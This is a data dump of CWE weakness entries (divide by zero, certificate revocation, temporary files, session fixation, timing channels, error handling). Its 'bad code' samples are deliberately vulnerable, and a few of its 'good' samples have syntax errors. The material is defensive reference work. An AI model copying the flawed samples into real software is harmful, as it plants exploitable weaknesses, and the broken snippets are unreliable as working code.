CWE-369: Divide By Zero,The product divides a value by zero.,"Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartA Divide by Zero results in a crash., Likelihood: ","Example 1The following Java example contains a function to compute an average but does not validate that the input value used as the denominator is not zero. This will create an exception for attempting to divide by zero. If this error is not handled by Java exception handling, unexpected results can occur.(bad code)Example Language:Javapublic int computeAverageResponseTime (int totalTime, int numRequests) {return totalTime / numRequests;}By validating the input value used as the denominator the following code will ensure that a divide by zero error will not cause unexpected results. The following Java code example will validate the input value, output an error message, and throw an exception.(good code)public int computeAverageResponseTime (int totalTime, int numRequests) throws ArithmeticException {if (numRequests == 0) {System.out.println(""Division by zero attempted!"");throw ArithmeticException;}return totalTime / numRequests;}Example 2The following C/C++ example contains a function that divides two numeric values without verifying that the input value used as the denominator is not zero. This will create an error for attempting to divide by zero, if this error is not caught by the error handling capabilities of the language, unexpected results can occur.(bad code)Example Language:Cdouble divide(double x, double y){return x/y;}By validating the input value used as the denominator the following code will ensure that a divide by zero error will not cause unexpected results. If the method is called and a zero is passed as the second argument a DivideByZero error will be thrown and should be caught by the calling block with an output message indicating the error.(good code)const int DivideByZero = 10;double divide(double x, double y){if ( 0 == y ){throw DivideByZero;}return x/y;}...try{divide(10, 0);}catch( int i ){if(i==DivideByZero) {cerr<<""Divide by zero error"";}}Example 2 References:[REF-371] Alex Allain. ""Handling Errors Exceptionally Well in C++"". <https://www.cprogramming.com/tutorial/exceptions.html>.URL validated: 2023-04-07.Example 3The following C# example contains a function that divides two numeric values without verifying that the input value used as the denominator is not zero. This will create an error for attempting to divide by zero, if this error is not caught by the error handling capabilities of the language, unexpected results can occur.(bad code)Example Language:C#int Division(int x, int y){return (x / y);}The method can be modified to raise, catch and handle the DivideByZeroException if the input value used as the denominator is zero.(good code)int SafeDivision(int x, int y){try{return (x / y);}catch (System.DivideByZeroException dbz){System.Console.WriteLine(""Division by zero attempted!"");return 0;}}Example 3 References:[REF-372] Microsoft. ""Exceptions and Exception Handling (C# Programming Guide)"". <https://msdn.microsoft.com/pl-pl/library/ms173160(v=vs.100).aspx>.",无可能的缓解方案
CWE-370: Missing Check for Certificate Revocation after Initial Check,"The product does not check the revocation status of a certificate after its initial revocation check, which can cause the product to perform privileged actions even after the certificate is revoked at a later time.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityTrust may be assigned to an entity who is not who it claims to be., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application DataData from an untrusted (and possibly malicious) source may be integrated., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataData may be disclosed to an entity impersonating a trusted entity, resulting in information disclosure., Likelihood: ","Example 1The following code checks a certificate before performing an action.(bad code)Example Language:Cif (cert = SSL_get_peer_certificate(ssl)) {foo=SSL_get_verify_result(ssl);if (X509_V_OK==foo)//do stufffoo=SSL_get_verify_result(ssl);//do more stuff without the check.While the code performs the certificate verification before each action, it does not check the result of the verification after the initial attempt. The certificate may have been revoked in the time between the privileged actions.","Phase:  Architecture and DesignEnsure that certificates are checked for revoked status before each use of a protected resource. If the certificate is checked before each access of a protected resource, the delay subject to a possible race condition becomes almost negligible and significantly reduces the risk associated with this issue."
CWE CATEGORY: State Issues,Weaknesses in this category are related to improper management of system state.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-372: Incomplete Internal State Distinction,"The product does not properly determine which state it is in, causing it to assume it is in state X when in fact it is in state Y, causing it to perform incorrect operations in a security-relevant manner.","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-373: DEPRECATED: State Synchronization Error,This entry was deprecated because it overlapped the same concepts as race condition (CWE-362) and Improper Synchronization (CWE-662).,无常见后果信息,无示范例子,无可能的缓解方案
CWE-374: Passing Mutable Objects to an Untrusted Method,The product sends non-cloned mutable data as an argument to a method or function.,"Scope: Integrity, Impact: Technical Impact:Modify MemoryPotentially data could be tampered with by another function which should not have been tampered with., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Cprivate:int foo;complexType bar;String baz;otherClass externalClass;public:void doStuff() {externalClass.doOtherStuff(foo, bar, baz)}In this example, bar and baz will be passed by reference to doOtherStuff() which may change them.Example 2In the following Java example, the BookStore class manages the sale of books in a bookstore, this class includes the member objects for the bookstore inventory and sales database manager classes. The BookStore class includes a method for updating the sales database and inventory when a book is sold. This method retrieves a Book object from the bookstore inventory object using the supplied ISBN number for the book class, then calls a method for the sales object to update the sales information and then calls a method for the inventory object to update inventory for the BookStore.(bad code)Example Language:Javapublic class BookStore {private BookStoreInventory inventory;private SalesDBManager sales;...// constructor for BookStorepublic BookStore() {this.inventory = new BookStoreInventory();this.sales = new SalesDBManager();...}public void updateSalesAndInventoryForBookSold(String bookISBN) {// Get book object from inventory using ISBNBook book = inventory.getBookWithISBN(bookISBN);// update sales information for book soldsales.updateSalesInformation(book);// update inventoryinventory.updateInventory(book);}// other BookStore methods...}public class Book {private String title;private String author;private String isbn;// Book object constructors and get/set methods...}However, in this example the Book object that is retrieved and passed to the method of the sales object could have its contents modified by the method. This could cause unexpected results when the book object is sent to the method for the inventory object to update the inventory.In the Java programming language arguments to methods are passed by value, however in the case of objects a reference to the object is passed by value to the method. When an object reference is passed as a method argument a copy of the object reference is made within the method and therefore both references point to the same object. This allows the contents of the object to be modified by the method that holds the copy of the object reference. [REF-374]In this case the contents of the Book object could be modified by the method of the sales object prior to the call to update the inventory.To prevent the contents of the Book object from being modified, a copy of the Book object should be made before the method call to the sales object. In the following example a copy of the Book object is made using the clone() method and the copy of the Book object is passed to the method of the sales object. This will prevent any changes being made to the original Book object.(good code)Example Language:Java...public void updateSalesAndInventoryForBookSold(String bookISBN) {// Get book object from inventory using ISBNBook book = inventory.getBookWithISBN(bookISBN);// Create copy of book object to make sure contents are not changedBook bookSold = (Book) book.clone();// update sales information for book soldsales.updateSalesInformation(bookSold);// update inventoryinventory.updateInventory(book);}...","Phase:  ImplementationPass in data which should not be altered as constant or immutable.Phase:  ImplementationClone all mutable data before passing it into an external function . This is the preferred mitigation. This way, regardless of what changes are made to the data, a valid copy is retained for use by the class."
CWE-375: Returning a Mutable Object to an Untrusted Caller,Sending non-cloned mutable data as a return value may result in that data being altered or deleted by the calling function.,"Scope: Access ControlIntegrity, Impact: Technical Impact:Modify MemoryPotentially data could be tampered with by another function which should not have been tampered with., Likelihood: ","Example 1This class has a private list of patients, but provides a way to see the list :(bad code)Example Language:Javapublic class ClinicalTrial {private PatientClass[] patientList = new PatientClass[50];public getPatients(...){return patientList;}}While this code only means to allow reading of the patient list, the getPatients() method returns a reference to the class's original patient list instead of a reference to a copy of the list. Any caller of this method can arbitrarily modify the contents of the patient list even though it is a private member of the class.","Phase:  ImplementationDeclare returned data which should not be altered as constant or immutable.Phase:  ImplementationClone all mutable data before returning references to it. This is the preferred mitigation. This way, regardless of what changes are made to the data, a valid copy is retained for use by the class."
CWE CATEGORY: DEPRECATED: Temporary File Issues,"This category has been deprecated. It was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree. Consider using the File Handling Issues category (CWE-1219).",无常见后果信息,无示范例子,无可能的缓解方案
CWE-377: Insecure Temporary File,Creating and using insecure temporary files can leave application and system data vulnerable to attack.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ","Example 1The following code uses a temporary file for storing intermediate data gathered from the network before it is processed.(bad code)Example Language:Cif (tmpnam_r(filename)) {FILE* tmp = fopen(filename,""wb+"");while((recv(sock,recvbuf,DATA_SIZE, 0) > 0)&(amt!=0)) amt = fwrite(recvbuf,1,DATA_SIZE,tmp);}...This otherwise unremarkable code is vulnerable to a number of different attacks because it relies on an insecure method for creating temporary files. The vulnerabilities introduced by this function and others are described in the following sections. The most egregious security problems related to temporary file creation have occurred on Unix-based operating systems, but Windows applications have parallel risks. This section includes a discussion of temporary file creation on both Unix and Windows systems. Methods and behaviors can vary between systems, but the fundamental risks introduced by each are reasonably constant.",无可能的缓解方案
CWE-378: Creation of Temporary File With Insecure Permissions,"Opening temporary files without appropriate measures or controls can leave the file, its contents and any function that it impacts vulnerable to attack.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataIf the temporary file can be read by the attacker, sensitive information may be in that file which could be revealed., Likelihood: ; Scope: AuthorizationOther, Impact: Technical Impact:OtherIf that file can be written to by the attacker, the file might be moved into a place to which the attacker does not have access. This will allow the attacker to gain selective resource access-control privileges., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherDepending on the data stored in the temporary file, there is the potential for an attacker to gain an additional input vector which is trusted as non-malicious. It may be possible to make arbitrary changes to data structures, user information, or even process ownership., Likelihood: ","Example 1In the following code examples a temporary file is created and written to.  After using the temporary file, the file is closed and deleted from the file system.(bad code)Example Language:CFILE *stream;if( (stream = tmpfile()) == NULL ) {perror(""Could not open new temporary file\n"");return (-1);}// write data to tmp file...// remove tmp filermtmp();However, within this C/C++ code the method tmpfile() is used to create and open the temp file. The tmpfile() method works the same way as the fopen() method would with read/write permission, allowing attackers to read potentially sensitive information contained in the temp file or modify the contents of the file.(bad code)Example Language:Javatry {File temp = File.createTempFile(""pattern"", "".suffix"");temp.deleteOnExit();BufferedWriter out = new BufferedWriter(new FileWriter(temp));out.write(""aString"");out.close();}catch (IOException e) {}Similarly, the createTempFile() method used in the Java code creates a temp file that may be readable and writable to all users.Additionally both methods used above place the file into a default directory. On UNIX systems the default directory is usually ""/tmp"" or ""/var/tmp"" and on Windows systems the default directory is usually ""C:\\Windows\\Temp"", which may be easily accessible to attackers, possibly enabling them to read and modify the contents of the temp file.",Phase:  RequirementsMany contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.Phase:  ImplementationEnsure that you use proper file permissions. This can be achieved by using a safe temp file function. Temporary files should be writable and readable only by the process that owns the file.Phase:  ImplementationRandomize temporary file names. This can also be achieved by using a safe temp-file function. This will ensure that temporary files will not be created in predictable places.
CWE-379: Creation of Temporary File in Directory with Insecure Permissions,The product creates a temporary file in a directory whose permissions allow unintended actors to determine the file's existence or otherwise access that file.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataSince the file is visible and the application which is using the temp file could be known, the attacker has gained information about what the user is doing at that time., Likelihood: ","Example 1In the following code examples a temporary file is created and written to.  After using the temporary file, the file is closed and deleted from the file system.(bad code)Example Language:CFILE *stream;if( (stream = tmpfile()) == NULL ) {perror(""Could not open new temporary file\n"");return (-1);}// write data to tmp file...// remove tmp filermtmp();However, within this C/C++ code the method tmpfile() is used to create and open the temp file. The tmpfile() method works the same way as the fopen() method would with read/write permission, allowing attackers to read potentially sensitive information contained in the temp file or modify the contents of the file.(bad code)Example Language:Javatry {File temp = File.createTempFile(""pattern"", "".suffix"");temp.deleteOnExit();BufferedWriter out = new BufferedWriter(new FileWriter(temp));out.write(""aString"");out.close();}catch (IOException e) {}Similarly, the createTempFile() method used in the Java code creates a temp file that may be readable and writable to all users.Additionally both methods used above place the file into a default directory. On UNIX systems the default directory is usually ""/tmp"" or ""/var/tmp"" and on Windows systems the default directory is usually ""C:\\Windows\\Temp"", which may be easily accessible to attackers, possibly enabling them to read and modify the contents of the temp file.","Phase:  RequirementsMany contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.Phase:  ImplementationTry to store sensitive tempfiles in a directory which is not world readable -- i.e., per-user directories.Phase:  ImplementationAvoid using vulnerable temp file functions."
CWE CATEGORY: DEPRECATED: Technology-Specific Time and State Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: J2EE Time and State Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-382: J2EE Bad Practices: Use of System.exit(),"A J2EE application uses System.exit(), which also shuts down its container.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart, Likelihood: ","Example 1Included in the doPost() method defined below is a call to System.exit() in the event of a specific exception.(bad code)Example Language:JavaPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {try {...} catch (ApplicationSpecificException ase) {logger.error(""Caught: "" + ase.toString());System.exit(1);}}","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeThe shutdown function should be a privileged function available only to a properly authorized administrative userPhase:  ImplementationWeb applications should not call methods that cause the virtual machine to exit, such as System.exit()Phase:  ImplementationWeb applications should also not throw any Throwables to the application server as this may adversely affect the container.Phase:  ImplementationNon-web applications may have a main() method that contains a System.exit(), but generally should not call System.exit() from other locations in the code"
CWE-383: J2EE Bad Practices: Direct Use of Threads,Thread management in a Web application is forbidden in some circumstances and is always highly error prone.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1In the following example, a new Thread object is created and invoked directly from within the body of a doGet() method in a Java servlet.(bad code)Example Language:Javapublic void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {// Perform servlet tasks....// Create a new thread to handle background processing.Runnable r = new Runnable() {public void run() {// Process and store request statistics....}};new Thread(r).start();}","Phase:  Architecture and DesignFor EJB, use framework approaches for parallel execution, instead of using threads."
CWE-384: Session Fixation,"Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1The following example shows a snippet of code from a J2EE web application where the application authenticates users with LoginContext.login() without first calling HttpSession.invalidate().(bad code)Example Language:Javaprivate void auth(LoginContext lc, HttpSession session) throws LoginException {...lc.login();...}In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session. Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal.In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above. The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker.In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [12]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker. It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [29].Example 2The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the <code>j_security_check</code>, which typically does not invalidate the existing session before processing the login request.(bad code)Example Language:HTML<form method=""POST"" action=""j_security_check""><input type=""text"" name=""j_username""><input type=""text"" name=""j_password""></form>","Phase:  Architecture and DesignInvalidate any existing session identifiers prior to authorizing a new user session.Phase:  Architecture and DesignFor platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again."
CWE-385: Covert Timing Channel,"Covert timing channels convey information by modulating some aspect of system behavior over time, so that the program receiving the information can observe system behavior and infer protected information.","Scope: ConfidentialityOther, Impact: Technical Impact:Read Application Data; OtherInformation exposure., Likelihood: ","Example 1In this example, the attacker observes how long an authentication takes when the user types in the correct password.When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses.(bad code)Example Language:Pythondef validate_password(actual_pw, typed_pw):if len(actual_pw) <> len(typed_pw):return 0for i in len(actual_pw):if actual_pw[i] <> typed_pw[i]:return 0return 1Note that in this example, the actual password must be handled in constant time as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length.","Phase:  Architecture and DesignWhenever possible, specify implementation strategies that do not introduce time variances in operations.Phase:  ImplementationOften one can artificially manipulate the time which operations take or -- when operations occur -- can remove information from the attacker.Phase:  ImplementationIt is reasonable to add artificial or random delays so that the amount of CPU time consumed is independent of the action being taken by the application."
CWE-386: Symbolic Name not Mapping to Correct Object,"A constant symbolic reference to an object is used, even though the reference can resolve to a different object over time.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityThe attacker can gain access to otherwise unauthorized resources., Likelihood: ; Scope: IntegrityConfidentialityOther, Impact: Technical Impact:Modify Application Data; Modify Files or Directories; Read Application Data; Read Files or Directories; OtherRace conditions such as this kind may be employed to gain read or write access to resources not normally readable or writable by the user in question., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; OtherThe resource in question, or other resources (through the corrupted one) may be changed in undesirable ways by a malicious user., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesIf a file or other resource is written in this method, as opposed to a valid way, logging of the activity may not occur., Likelihood: ; Scope: Non-RepudiationIntegrity, Impact: Technical Impact:Modify Files or DirectoriesIn some cases it may be possible to delete files that a malicious user might not otherwise have access to -- such as log files., Likelihood: ",无示范例子,无可能的缓解方案
CWE CATEGORY: Signal Errors,Weaknesses in this category are related to the improper handling of signals.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 7PK - Errors,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that occur when an application does not properly handle errors that occur during processing. According to the authors of the Seven Pernicious Kingdoms, ""Errors and error handling represent a class of API. Errors related to error handling are so common that they deserve a special kingdom of their own. As with 'API Abuse,' there are two ways to introduce an error-related security vulnerability: the most common one is handling errors poorly (or not at all). The second is producing errors that either give out too much information (to possible attackers) or are difficult to handle.""",无常见后果信息,无示范例子,无可能的缓解方案
"CWE CATEGORY: Error Conditions, Return Values, Status Codes","This category includes weaknesses that occur if a function does not generate the correct return/status code, or if the application does not handle all possible return/status codes that could be generated by a function. This type of problem is most often found in conditions that are rarely encountered during the normal operation of the product. Presumably, most bugs related to common conditions are found and eliminated during development and testing. In some cases, the attacker can directly control or influence the environment to trigger the rare conditions.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-390: Detection of Error Condition Without Action,"The product detects a specific error, but takes no actions to handle the error.","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State; Alter Execution LogicAn attacker could utilize an ignored error condition to place the system in an unexpected state that could lead to the execution of unintended logic and could cause other unintended behavior., Likelihood: ","Example 1The following example attempts to allocate memory for a character. After the call to malloc, an if statement is used to check whether the malloc function failed.(bad code)Example Language:Cfoo=malloc(sizeof(char)); //the next line checks to see if malloc failedif (foo==NULL) {//We do nothing so we just ignore the error.}The conditional successfully detects a NULL return value from malloc indicating a failure, however it does not do anything to handle the problem. Unhandled errors may have unexpected results and may cause the program to crash or terminate.Instead, the if block should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following example notifies the user that the malloc function did not allocate the required memory resources and returns an error code.(good code)Example Language:Cfoo=malloc(sizeof(char)); //the next line checks to see if malloc failedif (foo==NULL) {printf(""Malloc failed to allocate memory resources"");return -1;}Example 2In the following C++ example the method readFile() will read the file whose name is provided in the input parameter and will return the contents of the file in char string. The method calls open() and read() may result in errors if the file does not exist or does not contain any data to read. These errors will be thrown when the is_open() method and good() method indicate errors opening or reading the file. However, these errors are not handled within the catch statement. Catch statements that do not perform any processing will have unexpected results. In this case an empty char string will be returned, and the file will not be properly closed.(bad code)Example Language:C++char* readfile (char *filename) {try {// open input fileifstream infile;infile.open(filename);if (!infile.is_open()) {throw ""Unable to open file "" + filename;}// get length of fileinfile.seekg (0, ios::end);int length = infile.tellg();infile.seekg (0, ios::beg);// allocate memorychar *buffer = new char [length];// read data from fileinfile.read (buffer,length);if (!infile.good()) {throw ""Unable to read from file "" + filename;}infile.close();return buffer;}catch (...) {/* bug: insert code to handle this later */}}The catch statement should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following C++ example contains two catch statements. The first of these will catch a specific error thrown within the try block, and the second catch statement will catch all other errors from within the catch block. Both catch statements will notify the user that an error has occurred, close the file, and rethrow to the block that called the readFile() method for further handling or possible termination of the program.(good code)Example Language:C++char* readFile (char *filename) {try {// open input fileifstream infile;infile.open(filename);if (!infile.is_open()) {throw ""Unable to open file "" + filename;}// get length of fileinfile.seekg (0, ios::end);int length = infile.tellg();infile.seekg (0, ios::beg);// allocate memorychar *buffer = new char [length];// read data from fileinfile.read (buffer,length);if (!infile.good()) {throw ""Unable to read from file "" + filename;}infile.close();return buffer;}catch (char *str) {printf(""Error: %s \n"", str);infile.close();throw str;}catch (...) {printf(""Error occurred trying to read from file \n"");infile.close();throw;}}Example 3In the following Java example the method readFile will read the file whose name is provided in the input parameter and will return the contents of the file in a String object. The constructor of the FileReader object and the read method call may throw exceptions and therefore must be within a try/catch block. While the catch statement in this example will catch thrown exceptions in order for the method to compile, no processing is performed to handle the thrown exceptions. Catch statements that do not perform any processing will have unexpected results. In this case, this will result in the return of a null String.(bad code)Example Language:Javapublic String readFile(String filename) {String retString = null;try {// initialize File and FileReader objectsFile file = new File(filename);FileReader fr = new FileReader(file);// initialize character bufferlong fLen = file.length();char[] cBuf = new char[(int) fLen];// read data from fileint iRead = fr.read(cBuf, 0, (int) fLen);// close filefr.close();retString = new String(cBuf);} catch (Exception ex) {/* do nothing, but catch so it'll compile... */}return retString;}The catch statement should contain statements that either attempt to fix the problem, notify the user that an exception has been raised and continue processing, or perform some cleanup and gracefully terminate the program. The following Java example contains three catch statements. The first of these will catch the FileNotFoundException that may be thrown by the FileReader constructor called within the try/catch block. The second catch statement will catch the IOException that may be thrown by the read method called within the try/catch block. The third catch statement will catch all other exceptions thrown within the try block. For all catch statements the user is notified that the exception has been thrown and the exception is rethrown to the block that called the readFile() method for further processing or possible termination of the program. Note that with Java it is usually good practice to use the getMessage() method of the exception class to provide more information to the user about the exception raised.(good code)Example Language:Javapublic String readFile(String filename) throws FileNotFoundException, IOException, Exception {String retString = null;try {// initialize File and FileReader objectsFile file = new File(filename);FileReader fr = new FileReader(file);// initialize character bufferlong fLen = file.length();char [] cBuf = new char[(int) fLen];// read data from fileint iRead = fr.read(cBuf, 0, (int) fLen);// close filefr.close();retString = new String(cBuf);} catch (FileNotFoundException ex) {System.err.println (""Error: FileNotFoundException opening the input file: "" + filename );System.err.println ("""" + ex.getMessage() );throw new FileNotFoundException(ex.getMessage());} catch (IOException ex) {System.err.println(""Error: IOException reading the input file.\n"" + ex.getMessage() );throw new IOException(ex);} catch (Exception ex) {System.err.println(""Error: Exception reading the input file.\n"" + ex.getMessage() );throw new Exception(ex);}return retString;}","Phase:  ImplementationProperly handle each exception. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.Phase:  ImplementationIf a function returns an error, it is important to either fix the problem and try again, alert the user that an error has happened and let the program continue, or alert the user and close and cleanup the program.Phase:  TestingSubject the product to extensive testing to discover some of the possible instances of where/how errors or return values are not handled. Consider testing techniques such as ad hoc, equivalence partitioning, robustness and fault tolerance, mutation, and fuzzing."
CWE-391: Unchecked Error Condition,"[PLANNED FOR DEPRECATION. SEE MAINTENANCE NOTES AND CONSIDERCWE-252,CWE-248, ORCWE-1069.] Ignoring exceptions and other error conditions may allow an attacker to induce unexpected behavior unnoticed.","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State; Alter Execution Logic, Likelihood: ","Example 1The following code excerpt ignores a rarely-thrown exception from doExchange().(bad code)Example Language:Javatry {doExchange();}catch (RareException e) {// this can never happen}If a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.","Phase:  RequirementsThe choice between a language which has named or unnamed exceptions needs to be done. While unnamed exceptions exacerbate the chance of not properly dealing with an exception, named exceptions suffer from the up call version of the weak base class problem.Phase:  RequirementsA language can be used which requires, at compile time, to catch all serious exceptions. However, one must make sure to use the most current version of the API as new exceptions could be added.Phase:  ImplementationCatch all relevant exceptions. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment."
CWE-392: Missing Report of Error Condition,The product encounters an error but does not provide a status code or return value to indicate that an error has occurred.,"Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected StateErrors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors., Likelihood: ","Example 1In the following snippet from a doPost() servlet method, the server returns ""200 OK"" (default) even if an error occurs.(bad code)Example Language:Javatry {// Something that may throw an exception....} catch (Throwable t) {logger.error(""Caught: "" + t.toString());return;}",无可能的缓解方案
CWE-393: Return of Wrong Status Code,"A function or operation returns an incorrect return value or status code that does not indicate an error, but causes the product to modify its behavior based on the incorrect result.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Alter Execution LogicThis weakness could place the system in a state that could lead unexpected logic to be executed or other unintended behaviors., Likelihood: ","Example 1In the following example, an HTTP 404 status code is returned in the event of an IOException encountered in a Java servlet. A 404 code is typically meant to indicate a non-existent resource and would be somewhat misleading in this case.(bad code)Example Language:Javatry {// something that might throw IOException...} catch (IOException ioe) {response.sendError(SC_NOT_FOUND);}",无可能的缓解方案
CWE-394: Unexpected Status Code or Return Value,"The product does not properly check when a function or operation returns a value that is legitimate for the function, but is not expected by the product.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Alter Execution Logic, Likelihood: ",无示范例子,无可能的缓解方案
CWE-395: Use of NullPointerException Catch to Detect NULL Pointer Dereference,Catching NullPointerException should not be used as an alternative to programmatic checks to prevent dereferencing a null pointer.,"Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU), Likelihood: ",Example 1The following code mistakenly catches a NullPointerException.(bad code)Example Language:Javatry {mysteryMethod();} catch (NullPointerException npe) {},Phases:  Architecture and Design; ImplementationDo not extensively rely on catching exceptions (especially for validating user input) to handle errors. Handling exceptions can decrease the performance of an application.
CWE-396: Declaration of Catch for Generic Exception,Catching overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.,"Scope: Non-RepudiationOther, Impact: Technical Impact:Hide Activities; Alter Execution Logic, Likelihood: ","Example 1The following code excerpt handles three types of exceptions in an identical fashion.(good code)Example Language:Javatry {doExchange();}catch (IOException e) {logger.error(""doExchange failed"", e);}catch (InvocationTargetException e) {logger.error(""doExchange failed"", e);}catch (SQLException e) {logger.error(""doExchange failed"", e);}At first blush, it may seem preferable to deal with these exceptions in a single catch block, as follows:(bad code)try {doExchange();}catch (Exception e) {logger.error(""doExchange failed"", e);}However, if doExchange() is modified to throw a new type of exception that should be handled in some different kind of way, the broad catch block will prevent the compiler from pointing out the situation. Further, the new catch block will now also handle exceptions derived from RuntimeException such as ClassCastException, and NullPointerException, which is not the programmer's intent.",无可能的缓解方案
CWE-397: Declaration of Throws for Generic Exception,Throwing overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.,"Scope: Non-RepudiationOther, Impact: Technical Impact:Hide Activities; Alter Execution Logic, Likelihood: ","Example 1The following method throws three types of exceptions.(good code)Example Language:Javapublic void doExchange() throws IOException, InvocationTargetException, SQLException {...}While it might seem tidier to write(bad code)public void doExchange() throws Exception {...}doing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of doExchange() introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement.Example 2Early versions of C++ (C++98, C++03, C++11) included a feature known as Dynamic Exception Specification. This allowed functions to declare what type of exceptions it may throw. It is possible to declare a general class of exception to cover any derived exceptions that may be throw.(bad code)int myfunction() throw(std::exception) {if (0) throw out_of_range();throw length_error();}In the example above, the code declares that myfunction() can throw an exception of type ""std::exception"" thus hiding details about the possible derived exceptions that could potentially be thrown.",无可能的缓解方案
CWE CATEGORY: 7PK - Code Quality,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that do not directly introduce a weakness or vulnerability, but indicate that the product has not been carefully developed or maintained. According to the authors of the Seven Pernicious Kingdoms, ""Poor code quality leads to unpredictable behavior. From a user's perspective that often manifests itself as poor usability. For an adversary it provides an opportunity to stress the system in unexpected ways.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Resource Management Errors,Weaknesses in this category are related to improper management of system resources.,无常见后果信息,无示范例子,无可能的缓解方案
